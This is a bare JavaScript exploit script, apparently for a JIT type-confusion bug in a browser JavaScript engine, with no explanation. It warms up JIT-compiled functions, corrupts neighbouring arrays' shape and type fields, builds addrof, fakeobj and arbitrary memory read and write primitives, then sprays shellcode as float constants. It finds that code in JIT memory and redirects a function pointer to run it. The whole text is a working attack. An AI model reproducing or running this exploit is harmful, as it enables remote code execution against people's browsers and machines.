B = new Array();
B.push(new Array(1.1,1.1));
B.push(new Uint32Array(0x10));
B.push(new Array(1.1,1.1));
B.push(new Uint8Array(0x40));
B.push(new Array(1.1,"abc"));
B.push(new Float64Array(1));
let convert = new ArrayBuffer(8);
let float64 = new Float64Array(convert);
let uint32 = new Uint32Array(convert);

function dtoi(x) {
  float64[0] = x;
  return uint32;
}

function itod(x) {
  uint32[0] = x % 0x100000000;
  uint32[1] = x / 0x100000000;
  return float64[0];
}

function dtohex(i2) {
  i2 = dtoi(i2);
  var v1 = ("00000000" + i2[0].toString(16)).substr(-8);
  var v2 = ("00000000" + i2[1].toString(16)).substr(-8);
  return "0x"+v2+v1;
}

function fadd(a,b){
	float64[0] = a;
	uint32[0] += b;
	return float64[0];
}


function trigger(A,ii,idx,val){
        A[ii][idx] = val;
        for(let i=0;i<0x1000;i++) {};
}
function show(A,ii,idx){
        for(let i=0;i<0x1000;i++) {};
	return A[ii][idx];
}


for(let i=0;i<0x100;i++) show(B,0,0);
shape = show(B,0,2);
type = show(B,0,3);
for(let i=0;i<0x100;i++) trigger(B,2,0,-1.1);
trigger(B,2,2,shape);
trigger(B,2,3,type);
function addrof(x){
	B[4][0] = x;
	uint32[0] = B[3][0x1c];
	uint32[1] = B[3][0x1d] & 0xffff;
	return float64[0];
}
function fakeobj(addr){
	float64[0] = addr;
	B[3][0x1c] = uint32[0];
	B[3][0x1d] = uint32[1] | 0xfffe0000;
	return B[4][0];
}
function read(addr){
	float64[0] = addr;
	B[3][0x2e] = uint32[0];
	B[3][0x2f] = uint32[1];
	return B[5][0];
}
function write(addr,val){
	float64[0] = addr;
	B[3][0x2e] = uint32[0];
	B[3][0x2f] = uint32[1];
	B[5][0] = val;
}

DATA = new Uint32Array(0x100);
magic = 7.7345312477677771e-307;
function jit(){
	const a = 7.7345312477677771e-307;
	a0 = 7.748604185565308e-304;
a8 = 2.3202589502418505e+166;
a16 = 1.773289739160286e-288;
a24 = 3.8902833340666215e-80;
a32 = 1.640237906190011e+43;
a40 = -2.4923024921154913e+35;
a48 = -11920.000000000353;
a56 = -6.603882128794727e-229;

}
for(let i=0;i<0x1000;i++) jit();
js_function_addr = addrof(jit);
funtion_ptr = read(fadd(js_function_addr,0x30));
jit_memory = read(funtion_ptr);
for(let i=0;;i++){
	if( read(jit_memory) == magic){

		jit_memory = fadd(jit_memory,0x8);
		break;
	}
	jit_memory = fadd(jit_memory,1);
}
console.log(dtohex(jit_memory));
write(funtion_ptr,jit_memory);
jit();





